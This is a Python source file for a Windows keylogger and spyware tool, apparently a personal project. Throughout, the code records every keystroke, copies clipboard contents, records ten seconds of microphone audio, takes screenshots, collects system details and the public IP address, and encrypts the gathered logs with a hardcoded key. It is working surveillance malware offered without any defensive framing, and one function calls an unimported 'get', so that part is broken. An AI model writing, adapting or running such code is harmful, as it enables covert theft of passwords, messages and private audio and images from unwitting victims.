import socket
import platform
import time
import win32clipboard
from pynput.keyboard import Key, Listener
from scipy.io.wavfile import write
import sounddevice as sd
from PIL import ImageGrab
from cryptography.fernet import Fernet

keys_information = "key_log.txt"
keys_information_e = "e_key_log.txt"
file_path = "C:\\Users\\devv2\\PycharmProjects\\keylogger\\cryptography"
extend = "\\"
file_merge = file_path + extend
clipboard_information = "clipboard.txt"
clipboard_information_e = "e_clipboard.txt"
microphone_time = 10
audio_information = "audio.wav"
screenshot_information = "screenshot.png"
system_information = "systeminfo.txt"
system_information_e = "e_systeminfo.txt"
time_iteration = 15
number_of_iterations_end = 3
key = "yl9q7b92u2Knh8hJFYXqVVvl5fnpv20Z3yRsCD3nAcI="


# Function to gather computer information
def computer_information():
    with open(file_path + extend + system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip + '\n')
        except Exception:
            f.write("Couldn't get Public IP Address (most likely max query )\n")
        f.write("Processor: " + platform.processor() + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + '\n')
        f.write("Private IP Address: " + IPAddr + '\n')


# Function to copy clipboard data
def copy_clipboard():
    with open(file_path + extend + clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            f.write('Clipboard Data:\n' + pasted_data + '\n')
        except Exception as e:
            f.write("Clipboard could not be copied: " + str(e) + '\n')


# Function to record audio from microphone
def microphone():
    fs = 44100
    seconds = microphone_time
    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()
    write(file_path + extend + audio_information, fs, myrecording)


# Function to take a screenshot
def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_information)


# Gathering computer information
computer_information()

# Keylogger functionality
number_of_iteration = 0
while number_of_iteration < number_of_iterations_end:
    currentTime = time.time()
    stoppingTime = currentTime + time_iteration

    count = 0
    keys = []

    def on_press(key):
        global keys, count, currentTime
        print(key)
        keys.append(key)
        count += 1
        currentTime = time.time()

        if count >= 1:
            count = 0
            write_file(keys)
            keys = []

    def write_file(keys):
        with open(file_path + extend + keys_information, "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write('\n')
                elif k.find("key") == -1:
                    f.write(k)

    def on_release(key):
        if key == Key.esc:
            return False
        if currentTime > stoppingTime:
            return False

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    if currentTime > stoppingTime:
        with open(file_path + extend + keys_information , "w") as f:
            f.write(" ")

        screenshot()
        copy_clipboard()
        microphone()  # Call the microphone function to record audio
        number_of_iteration += 1

        currentTime = time.time()
        stoppingTime = time.time() + time_iteration

        # Encrypt files
        files_to_encrypt = [file_merge + system_information, file_merge + clipboard_information, file_merge + keys_information]
        encrypted_file_names = [file_merge + system_information_e,  file_merge + clipboard_information_e , file_merge + keys_information_e]

        for i in range(len(files_to_encrypt)):
            with open(files_to_encrypt[i], 'rb') as f:
                data = f.read()

            fernet = Fernet(key)
            encrypted = fernet.encrypt(data)
            with open(encrypted_file_names[i], 'wb') as f:
                f.write(encrypted)

    # Adding correct sleep function call
    time.sleep(20)
